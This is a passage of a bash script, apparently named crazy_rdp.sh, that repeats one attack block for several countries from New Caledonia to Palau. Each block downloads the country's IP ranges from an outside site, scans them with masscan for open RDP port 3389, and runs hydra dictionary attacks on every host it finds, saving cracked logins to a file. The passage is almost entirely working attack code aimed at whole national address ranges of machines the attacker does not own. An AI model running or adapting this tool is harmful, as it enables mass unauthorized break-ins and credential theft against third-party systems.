
echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "131" ]; then
curl http://ipdiapazon.16mb.com/New_caledonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "132" ]; then
curl http://ipdiapazon.16mb.com/New_zealand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "133" ]; then
curl http://ipdiapazon.16mb.com/Nicaragua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "134" ]; then
curl http://ipdiapazon.16mb.com/Niger.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "135" ]; then
curl http://ipdiapazon.16mb.com/Nigeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "136" ]; then
curl http://ipdiapazon.16mb.com/Niue.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "137" ]; then
curl http://ipdiapazon.16mb.com/Non-spec.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "138" ]; then
curl http://ipdiapazon.16mb.com/Norfolk.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "139" ]; then
curl http://ipdiapazon.16mb.com/Northern.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "140" ]; then
curl http://ipdiapazon.16mb.com/Norway.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "141" ]; then
curl http://ipdiapazon.16mb.com/Oman.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


else
if [ $country = "142" ]; then
curl http://ipdiapazon.16mb.com/Pakistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "143" ]; then
curl http://ipdiapazon.16mb.com/Palau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
